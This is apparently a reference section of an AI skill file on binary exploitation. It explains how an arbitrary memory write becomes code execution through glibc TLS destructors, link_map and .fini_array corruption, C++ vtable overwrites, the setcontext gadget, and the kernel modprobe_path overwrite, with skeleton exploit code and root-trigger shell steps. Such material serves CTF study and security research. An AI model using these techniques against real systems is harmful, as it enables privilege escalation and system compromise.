# arbitrary-write-to-rce technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 6. TLS_dtor_list (glibc ≥ 2.34)

**Thread-local destructor list — the primary post-2.34 target.**

```c
// Called during __call_tls_dtors() in exit flow
// Each entry: { void (*func)(void *), void *obj, void *next }
// func is MANGLED same as exit_funcs (PTR_DEMANGLE)
```

### Location

```
TLS area (pointed by fs register on x86-64)
tls_dtor_list is a thread-local variable in libc
Typically at fs:[offset] — offset found via libc symbol or brute-force
```

### Exploitation

```python
# 1. Leak TLS base address (e.g., via canary leak: canary at fs:[0x28])
# 2. Compute tls_dtor_list address
# 3. Forge a tls_dtor_list entry:
entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)
entry += p64(arg_value)         # obj (passed as argument to func)
entry += p64(0)                 # next = NULL (end of list)
# 4. Write entry to heap, set tls_dtor_list to point to it
# 5. Trigger: exit() → __call_tls_dtors() → func(obj)
```

---

## 7. _dl_fini / LINK_MAP CORRUPTION

### Attack Vector

During `exit()`, `_dl_fini` iterates the link_map list and calls `DT_FINI_ARRAY` entries.

```c
// In _dl_fini:
for each loaded library (link_map entry):
    if l_info[DT_FINI_ARRAY]:
        array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
        for each entry in array:
            entry()  // call destructor
```

### Exploitation

1. Corrupt a `link_map` entry's `l_addr` (relocation base) to shift the FINI_ARRAY pointer
2. Or corrupt `l_info[DT_FINI_ARRAY]` to point to fake array
3. Fake array contains target function pointer (system, one_gadget)
4. Trigger: `exit()` → `_dl_fini` → calls fake destructor

**Advantage**: No pointer mangling (function pointers in FINI_ARRAY are not mangled).

---

## 8. modprobe_path (KERNEL)

**Overwrite the kernel's `modprobe_path` to execute arbitrary commands as root.**

```python
# 1. Arbitrary kernel write: overwrite modprobe_path ("/sbin/modprobe")
#    with "/tmp/x" (attacker's script)
kernel_write(modprobe_path_addr, b'/tmp/x\x00')

# 2. Prepare script:
# echo '#!/bin/sh' > /tmp/x
# echo 'cat /flag > /tmp/output' >> /tmp/x
# chmod +x /tmp/x

# 3. Trigger: execute a file with unknown binary format
# echo -ne '\xff\xff\xff\xff' > /tmp/trigger
# chmod +x /tmp/trigger
# /tmp/trigger
# → kernel calls modprobe_path ("/tmp/x") as root
```

See [kernel-exploitation](../../kernel-exploitation/SKILL.md) for kernel write primitives.

---

## 9. .fini_array

**Overwrite destructor function pointers called during normal program exit.**

```python
# .fini_array contains function pointers called in reverse order during exit
# Typically: [__do_global_dtors_aux, ...]
# Overwrite first entry with target (main for loop, system for RCE)

# Two-stage: .fini_array[0] = main (loop back), .fini_array[1] = <exploit_func>
# First exit: calls .fini_array[1] (exploit_func), then .fini_array[0] (main)
# In main loop: set up final exploit
```

**Limitation**: `.fini_array` may be read-only in Full RELRO binaries.

---

## 10. C++ VTABLE OVERWRITE

```cpp
// C++ objects with virtual functions have a vptr at offset 0
// vptr → vtable → array of function pointers
// Overwrite vptr to point to fake vtable with controlled function pointers

// Object layout:
// +0x00: vptr → [vtable_entry_0, vtable_entry_1, ...]
// +0x08: member data...
```

```python
# 1. Leak object address and vptr
# 2. Create fake vtable in controlled memory:
fake_vtable = p64(0)              # offset -0x10 (RTTI info)
fake_vtable += p64(0)             # offset -0x08 (RTTI info)
fake_vtable += p64(target_func)   # virtual function 0 → system / one_gadget
fake_vtable += p64(target_func)   # virtual function 1
# 3. Overwrite vptr to point to fake_vtable + 0x10 (skip RTTI prefix)
# 4. Trigger: call virtual function on the object
```

---

## 11. setcontext GADGET

`setcontext` in libc loads registers from a `ucontext_t` structure — useful as a pivot gadget.

### glibc < 2.29

```c
// setcontext+53: loads registers from [rdi + offsets]
// RDI = first argument = pointer to controlled buffer
// Sets RSP, RIP, and all other registers → full control
```

### glibc ≥ 2.29

```c
// setcontext+61: loads registers from [rdx + offsets]
// Must control RDX, not RDI
// Need an intermediate gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]
```

```python
# Common pattern with __free_hook (pre-2.34):
# __free_hook = setcontext + 61
# free(chunk) → setcontext(chunk) where chunk contains fake ucontext
# From ucontext: set RSP to ROP chain, RIP to ret → ROP continues

# Post-2.34: combine with _IO_FILE exploitation
# _IO_FILE vtable call passes fp as first arg → use gadget to move to rdx → setcontext
```

---

